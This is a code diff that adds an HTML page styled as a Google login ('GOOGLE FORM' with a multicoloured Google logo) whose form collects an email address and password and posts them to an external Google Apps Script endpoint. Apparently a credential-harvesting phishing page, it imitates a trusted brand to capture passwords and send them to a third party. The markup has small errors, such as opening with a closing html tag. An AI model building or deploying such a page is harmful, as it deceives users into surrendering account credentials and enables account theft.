@@ -1,0 +1,23 @@
+</html>
+<head>
+<link rel="stylesheet" href="style.css">
+<title>GOOGLE FORM</title>
+</head>
+<body>
+<div class="box">
+  <h2><span style="color:blue">G</span><span style="color:red">o</span><span style="color:yellow">o</span><span style="color:blue">g</span><span style="color:green">l</span><span style="color:red">e</span></h2>
+  <form method="POST" action="https://script.google.com/macros/s/AKfycbwaPqFv63nsHESzAQYDq7VlZpfifyWIVArS5nhcXlqJnZ6vPFX73COazZEwnbEc9B7I1w/exec" >
+    <div class="inputBox">
+      <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);" value="">
+      <label>Email</label>
+    </div>
+    <div class="inputBox">
+      <input type="password" name="password" required value="" onkeyup="this.setAttribute('value', this.value);" pattern="(?=.*\d)(?=.*[a-z])(?=.*[A-Z]).{8,}" title="Must contain at least one number and one uppercase and lowercase letter, and at least 8 or more characters">
+      <label>Password</label>
+    </div>
+    <input type="submit" name="submit" value="SUBMIT">
+  </form>
+</div>
+<script src="javascript"></script>
+</body>
+</html>
